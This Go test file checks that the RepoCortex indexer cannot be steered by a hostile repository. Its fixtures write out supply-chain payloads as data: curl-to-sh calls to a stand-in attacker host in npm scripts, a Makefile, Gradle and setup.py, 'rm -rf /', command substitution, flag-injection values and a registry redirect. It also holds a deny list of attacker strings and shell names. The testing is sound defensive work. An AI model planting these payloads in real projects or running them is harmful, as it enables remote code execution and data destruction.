package indexer

import (
	"context"
	"os"
	"path/filepath"
	"reflect"
	"runtime"
	"strings"
	"testing"

	"github.com/satyendrakumarsingh/repocortex/internal/config"
)

// This file is the one that matters most in the package.
//
// The premise of every test here is that the repository on disk was written by
// an attacker and RepoCortex is being run on it seconds after `git clone`. The
// claim being tested is narrow and absolute: nothing in the working tree can
// change what RepoCortex executes, downloads or passes as an argument.

// hostileFiles is a repository that tries every trick available to a committed
// file. None of them may have any effect.
var hostileFiles = map[string]string{
	// A repo config using only keys the schema allows, with values chosen to
	// look like flags if they were ever interpolated into a command line.
	".cortex.yml": "" +
		"project:\n" +
		"  name: \"--privileged -v /:/host\"\n" +
		"index:\n" +
		"  include: [\"$(curl http://attacker.example/x|sh)\"]\n",

	// The classic: a lifecycle script that runs on `npm install`.
	"package.json": `{
  "name": "totally-fine",
  "scripts": {
    "prepare": "curl http://attacker.example/x | sh",
    "postinstall": "curl http://attacker.example/x | sh",
    "build": "rm -rf /"
  }
}`,
	"tsconfig.json": `{"compilerOptions":{"plugins":[{"name":"attacker-plugin"}]}}`,

	// A Makefile, in case anything ever decides `make` is a reasonable thing to
	// shell out to.
	"Makefile": "all:\n\tcurl http://attacker.example/x | sh\n",

	// npm reads .npmrc from the working directory. Redirecting the registry is
	// why provisioning never runs with the repository as its cwd.
	".npmrc": "registry=http://attacker.example/npm\n",

	// A toolchain directive: with GOTOOLCHAIN=auto the Go command would DOWNLOAD
	// and execute a compiler of the repository's choosing.
	"go.mod": "module x\n\ngo 1.25.0\n\ntoolchain go1.99.9\n",

	// Maven and Gradle both execute repository-supplied code by design.
	"pom.xml":      `<project><build><plugins><plugin><artifactId>attacker</artifactId></plugin></plugins></build></project>`,
	"build.gradle": `task evil { "curl http://attacker.example/x".execute() }`,

	"pyproject.toml": "[build-system]\nrequires = [\"attacker-backend\"]\n",
	"setup.py":       "import os; os.system('curl http://attacker.example/x | sh')",
}

// benignFiles is the same repository with the payloads removed. The plans for
// the two must be identical.
var benignFiles = map[string]string{
	"package.json":   "{}",
	"tsconfig.json":  "{}",
	"Makefile":       "all:\n\techo hi\n",
	".npmrc":         "",
	"go.mod":         "module x\n\ngo 1.25.0\n",
	"pom.xml":        "<project/>",
	"build.gradle":   "",
	"pyproject.toml": "",
	"setup.py":       "",
}

// attackerStrings are the payloads that must never reach a subprocess.
var attackerStrings = []string{
	"attacker.example", "curl", "--privileged", "rm -rf", "$(", "|sh", "| sh",
	"totally-fine", "attacker-plugin", "go1.99.9",
}

func planFor(t *testing.T, root string, cfg config.Config, r *fakeRunner) Plan {
	t.Helper()
	plan, err := NewPlanWith(context.Background(), root, cfg, Options{Runner: r, AllowRepoBuild: true})
	if err != nil {
		t.Fatalf("NewPlanWith: %v", err)
	}
	return plan
}

func fullyEquippedRunner() *fakeRunner {
	r := newFakeRunner("go", "node", "npm", "java", "mvn", "gradle", "docker")
	r.install("scip-go")
	r.install("scip-typescript")
	r.install("scip-python")
	r.install("scip-java")
	return r
}

// TestRepoCannotInfluenceThePlan is the headline test. Two repositories that
// differ only in the CONTENTS of their marker files must produce byte-identical
// plans, because the contents are never read.
func TestRepoCannotInfluenceThePlan(t *testing.T) {
	t.Setenv("CORTEX_CONFIG_HOME", t.TempDir()) // ignore the developer's own config

	hostile := writeRepo(t, hostileFiles)
	benign := writeRepo(t, benignFiles)

	hostileCfg, err := config.Load(hostile)
	if err != nil {
		t.Fatalf("config.Load on the hostile repo: %v", err)
	}
	benignCfg, err := config.Load(benign)
	if err != nil {
		t.Fatalf("config.Load on the benign repo: %v", err)
	}

	// First: the repo config was parsed and it moved nothing in the execution
	// domain. This is internal/config's guarantee; asserting it here is what
	// makes the rest of the test meaningful.
	def := config.Defaults()
	if hostileCfg.Accuracy != def.Accuracy ||
		hostileCfg.ProvisionPolicy != def.ProvisionPolicy ||
		hostileCfg.IndexerRunner != def.IndexerRunner ||
		hostileCfg.IndexerTimeout != def.IndexerTimeout ||
		len(hostileCfg.IndexerLanguages) != 0 {
		t.Fatalf("repo config reached the execution domain: %+v", hostileCfg)
	}
	// It did influence what gets INDEXED, which is allowed and is the whole
	// point of the trust split.
	if hostileCfg.ProjectName != "--privileged -v /:/host" {
		t.Fatalf("repo project name was not applied: %q", hostileCfg.ProjectName)
	}

	hostileCfg.Accuracy = config.AccuracyAuto
	benignCfg.Accuracy = config.AccuracyAuto

	hostilePlan := planFor(t, hostile, hostileCfg, fullyEquippedRunner())
	benignPlan := planFor(t, benign, benignCfg, fullyEquippedRunner())

	if !reflect.DeepEqual(stepShape(hostilePlan), stepShape(benignPlan)) {
		t.Fatalf("the hostile repository changed the plan:\n hostile %v\n benign  %v",
			stepShape(hostilePlan), stepShape(benignPlan))
	}
	if len(hostilePlan.Runnable()) == 0 {
		t.Fatal("the fixture planned no work, so this test would prove nothing")
	}
}

// TestRepoCannotInfluenceWhatIsExecuted runs the plan and inspects every argv,
// working directory and environment that reached the fake operating system.
func TestRepoCannotInfluenceWhatIsExecuted(t *testing.T) {
	t.Setenv("CORTEX_CONFIG_HOME", t.TempDir())

	root := writeRepo(t, hostileFiles)
	cfg, err := config.Load(root)
	if err != nil {
		t.Fatalf("config.Load: %v", err)
	}
	cfg.Accuracy = config.AccuracyAuto
	cfg.ProvisionPolicy = config.ProvisionAuto // most permissive: give it every chance

	r := fullyEquippedRunner()
	plan, err := NewPlanWith(context.Background(), root, cfg, Options{
		Runner: r, AllowRepoBuild: true, AssumeYes: true,
	})
	if err != nil {
		t.Fatalf("NewPlanWith: %v", err)
	}
	res, err := Execute(context.Background(), plan, Options{
		Runner: r, AllowRepoBuild: true, AssumeYes: true,
	})
	if err != nil {
		t.Fatalf("Execute: %v", err)
	}
	t.Cleanup(func() { CleanupOutput(res.OutputDir) })
	if len(r.calls()) == 0 {
		t.Fatal("nothing ran, so this test would prove nothing")
	}

	for _, c := range r.calls() {
		// No shell, ever. Not even indirectly.
		switch filepath.Base(c.Path) {
		case "sh", "bash", "zsh", "cmd", "cmd.exe", "powershell", "make":
			t.Errorf("spawned a shell or build driver: %v", c.Argv())
		}
		for _, arg := range c.Args {
			for _, bad := range attackerStrings {
				if strings.Contains(arg, bad) {
					t.Errorf("repository-supplied text %q reached an argument: %v", bad, c.Argv())
				}
			}
		}
		// The executable is always resolved, never a bare or relative name that
		// could be satisfied from the repository directory.
		if !filepath.IsAbs(c.Path) {
			t.Errorf("relative executable %q", c.Path)
		}
		// Anything writing output writes it into the output directory only.
		if out := flagValue(c.Args, "--output"); out != "" {
			if filepath.Dir(out) != res.OutputDir {
				t.Errorf("--output %q escapes the output directory", out)
			}
		}
	}

	// The repository's own project name is the tempting thing to forward into
	// scip-python's --project-name. It must not appear anywhere.
	for _, argv := range r.argvs() {
		if strings.Contains(argv, cfg.ProjectName) {
			t.Errorf("the repository's project name reached an argv: %s", argv)
		}
	}
}

// TestRepoConfigCannotNameAnIndexer proves the boundary end to end rather than
// by inspection: a .cortex.yml that tries to set an execution field is
// REJECTED by config.Load, so there is no path by which the value could arrive
// here at all.
func TestRepoConfigCannotNameAnIndexer(t *testing.T) {
	t.Setenv("CORTEX_CONFIG_HOME", t.TempDir())

	for name, body := range map[string]string{
		"accuracy mode":     "accuracy:\n  mode: exact\n",
		"provisioning":      "accuracy:\n  indexers:\n    provision: auto\n",
		"runner":            "accuracy:\n  indexers:\n    runner: docker\n",
		"indexer languages": "accuracy:\n  indexers:\n    languages: [java]\n",
	} {
		t.Run(name, func(t *testing.T) {
			root := writeRepo(t, map[string]string{
				".cortex.yml": body,
				"go.mod":      "module x",
			})
			if _, err := config.Load(root); err == nil {
				t.Fatal("a repository set an execution field and config.Load accepted it")
			}
		})
	}
}

// TestMarkerFilesAreNeverRead is the strongest available proof that detection
// looks at names and not contents: make every marker file unreadable and check
// that planning is completely unaffected. If any code path opened one, this
// would fail.
func TestMarkerFilesAreNeverRead(t *testing.T) {
	if runtime.GOOS == "windows" {
		t.Skip("chmod does not deny reads on Windows")
	}
	if os.Getuid() == 0 {
		t.Skip("running as root; file modes do not deny reads")
	}
	t.Setenv("CORTEX_CONFIG_HOME", t.TempDir())

	readable := writeRepo(t, benignFiles)
	locked := writeRepo(t, benignFiles)
	for name := range benignFiles {
		if name == ".cortex.yml" {
			continue // config.Load legitimately reads this one
		}
		if err := os.Chmod(filepath.Join(locked, name), 0o000); err != nil {
			t.Fatalf("chmod %s: %v", name, err)
		}
	}
	t.Cleanup(func() {
		for name := range benignFiles {
			_ = os.Chmod(filepath.Join(locked, name), 0o644)
		}
	})

	cfg := config.Defaults()
	cfg.Accuracy = config.AccuracyAuto

	want := planFor(t, readable, cfg, fullyEquippedRunner())
	got := planFor(t, locked, cfg, fullyEquippedRunner())

	if !reflect.DeepEqual(stepShape(want), stepShape(got)) {
		t.Fatalf("unreadable marker files changed the plan:\n want %v\n got  %v",
			stepShape(want), stepShape(got))
	}
	if len(got.Runnable()) == 0 {
		t.Fatal("the fixture planned no work, so this test would prove nothing")
	}
}

// TestDirectoryNamedLikeAFlagIsRefused. A repository controls its directory
// names, and a sub-project directory is the one repository-derived value that
// has to cross into a subprocess. Anything that could be mistaken for an option
// is refused rather than quoted.
func TestDirectoryNamedLikeAFlagIsRefused(t *testing.T) {
	t.Parallel()
	root := writeRepo(t, map[string]string{
		"--output/package.json": "{}",
		"--output/index.js":     "",
		"web/package.json":      "{}",
		"web/index.js":          "",
	})
	r := newFakeRunner("node")
	r.install("scip-typescript")

	cfg := config.Defaults()
	cfg.Accuracy = config.AccuracyAuto
	plan, err := NewPlanWith(context.Background(), root, cfg, Options{Runner: r})
	if err != nil {
		t.Fatalf("NewPlanWith: %v", err)
	}
	res, err := Execute(context.Background(), plan, Options{Runner: r})
	if err != nil {
		t.Fatalf("Execute: %v", err)
	}
	t.Cleanup(func() { CleanupOutput(res.OutputDir) })

	if len(res.Indexes) != 1 || res.Indexes[0].Project.Dir != "web" {
		t.Fatalf("indexed %+v, want only web", res.Indexes)
	}
	if len(res.Skipped) != 1 {
		t.Fatalf("skips = %+v, want the flag-shaped directory refused", res.Skipped)
	}
	for _, c := range r.calls() {
		for _, a := range c.Args {
			if a == "--output/package.json" || strings.Contains(a, "--output/") {
				t.Errorf("a flag-shaped directory reached an argv: %v", c.Argv())
			}
		}
	}
}

// stepShape reduces a plan to the decisions it made, so two plans over
// different temp directories can be compared.
func stepShape(p Plan) []string {
	out := make([]string, 0, len(p.Steps))
	for _, s := range p.Steps {
		state := "run"
		switch {
		case s.Excluded:
			state = "excluded"
		case s.Blocked:
			state = "blocked:" + s.Reason
		case s.NeedsProvision:
			state = "provision"
		}
		out = append(out, string(s.Project.Language)+"|"+s.Project.Dir+"|"+
			string(s.Indexer)+"|"+strings.Join(s.Project.Markers, ",")+"|"+state)
	}
	return out
}
